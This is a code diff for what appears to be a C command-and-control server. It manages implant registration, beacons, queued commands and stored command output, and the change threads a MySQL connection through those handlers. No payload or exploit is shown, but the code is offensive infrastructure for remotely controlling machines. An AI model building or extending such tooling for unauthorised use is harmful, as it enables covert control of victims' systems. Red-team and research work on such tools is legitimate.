@@ -35,7 +35,7 @@ void GenerateID(const char *input, char output[9]) {
 }
 
 
-char *register_implant(cJSON *json, char *ip) {
+char *register_implant(MYSQL* con, cJSON *json, char *ip) {
     cJSON *hostname =  cJSON_GetObjectItem(json, "hostname");
     cJSON *os =  cJSON_GetObjectItem(json, "os");
     cJSON *arch = cJSON_GetObjectItem(json, "arch");
@@ -46,7 +46,7 @@ char *register_implant(cJSON *json, char *ip) {
     GenerateID(input, implant_id);
 
     // check if id already exists in database
-    if (check_implant_id(implant_id) == 1) goto REPLY;
+    if (check_implant_id(con, implant_id) == 1) goto REPLY;
 
     //log
     //log_new_agent(implant_id, os->valuestring, hostname->valuestring, mac->valuestring, arch->valuestring);
@@ -66,7 +66,7 @@ char *register_implant(cJSON *json, char *ip) {
 
     strncpy(args.arch, arch->valuestring, sizeof(args.arch) - 1);
     args.arch[sizeof(args.arch) - 1] = '\0';
-    new_implant(args);
+    new_implant(con, args);
 
     // reply with agent id
     REPLY:
@@ -80,17 +80,17 @@ char *register_implant(cJSON *json, char *ip) {
     return reply;
 }
 
-char *beacon_implant(cJSON *json) {
+char *beacon_implant(MYSQL* con, cJSON *json) {
     cJSON *implant_id = cJSON_GetObjectItem(json, "implant_id");
     // log
     log_message(LOG_INFO, "Beacon from %s", implant_id->valuestring);
     cJSON *json_reply = cJSON_CreateObject();
     // update last seen
-    update_last_seen(implant_id->valuestring);
+    update_last_seen(con, implant_id->valuestring);
     // validate if agent id exists in the database.
     
     
-    if (check_implant_id(implant_id->valuestring) == 0) {
+    if (check_implant_id(con, implant_id->valuestring) == 0) {
         cJSON_AddStringToObject(json_reply, "mode", "none");
         char *reply = cJSON_Print(json_reply);
         cJSON_Delete(json_reply);
@@ -103,14 +103,14 @@ char *beacon_implant(cJSON *json) {
 
     // check if there are tasks queue for agent
     // change this so that it stores all qeues in a data structure to optimize 
-    int task_id = check_tasks_queue(implant_id->valuestring);
+    int task_id = check_tasks_queue(con, implant_id->valuestring);
     if (task_id == -1) {
         cJSON_AddStringToObject(json_reply, "mode", "none");
         char *reply = cJSON_Print(json_reply);
         cJSON_Delete(json_reply);
         return reply;
     } else {
-        char *cmd =  get_task(task_id);
+        char *cmd =  get_task(con, task_id);
         if (cmd != NULL) {
             cJSON_AddStringToObject(json_reply, "command", cmd);
         } else {
@@ -145,7 +145,22 @@ char *beacon_implant(cJSON *json) {
 
 
 void *implant_handler(void *args) {
+
     struct implant_handler_t *arg = (struct implant_handler_t*)args;
+    
+    
+    MYSQL *con = get_db_connection();
+
+    if (con == NULL) {
+        log_message(LOG_ERROR, "Failed to get DB connection from pool");
+        return NULL;
+    }
+
+    // Check if connection is still alive
+    if (mysql_ping(con) != 0) {
+        log_message(LOG_WARN, "DB connection lost, reconnecting...");
+        return NULL;
+    }
 
     if (arg->encrypted) {
         SSL_CTX *ctx  = arg->ctx;
@@ -204,11 +219,11 @@ void *implant_handler(void *args) {
         if (!type) {
             log_message(LOG_WARN, "NO mode key in JSON");
         } else if (strcmp(type->valuestring, "register") == 0) {
-            char *reply = register_implant(json, arg->ip);
+            char *reply = register_implant(con, json, arg->ip);
             SSL_write(ssl, reply, strlen(reply));
             free(reply);
         } else if (strcmp(type->valuestring, "beacon") == 0) {
-            char *reply = beacon_implant(json);
+            char *reply = beacon_implant(con, json);
             SSL_write(ssl, reply, strlen(reply));
             cJSON *check_mode = cJSON_Parse(reply);
             free(reply);
@@ -233,7 +248,7 @@ void *implant_handler(void *args) {
             }
             cJSON *command_response = cJSON_GetObjectItem(response, "response");
             cJSON *task_id = cJSON_GetObjectItem(response, "task_id");
-            store_task_response(command_response->valuestring, task_id->valueint);
+            store_task_response(con, command_response->valuestring, task_id->valueint);
             cJSON_Delete(response);
         }
         CLEANUP: 
@@ -262,11 +277,11 @@ void *implant_handler(void *args) {
 
         cJSON *type = cJSON_GetObjectItem(json, "mode");
         if (strcmp(type->valuestring, "register") == 0) {
-            char *reply = register_implant(json, arg->ip);
+            char *reply = register_implant(con, json, arg->ip);
             send(sock, reply , strlen(reply), 0);
             free(reply);
         } else if (strcmp(type->valuestring, "beacon") == 0) {
-            char *reply = beacon_implant(json);
+            char *reply = beacon_implant(con, json);
 
             send(sock, reply, strlen(reply), 0);
             cJSON *check_mode = cJSON_Parse(reply);
@@ -293,7 +308,7 @@ void *implant_handler(void *args) {
             }
             cJSON *command_response = cJSON_GetObjectItem(response, "response");
             cJSON *task_id = cJSON_GetObjectItem(response, "task_id");
-            store_task_response(command_response->valuestring, task_id->valueint);
+            store_task_response(con, command_response->valuestring, task_id->valueint);
             cJSON_Delete(response);
             }
 
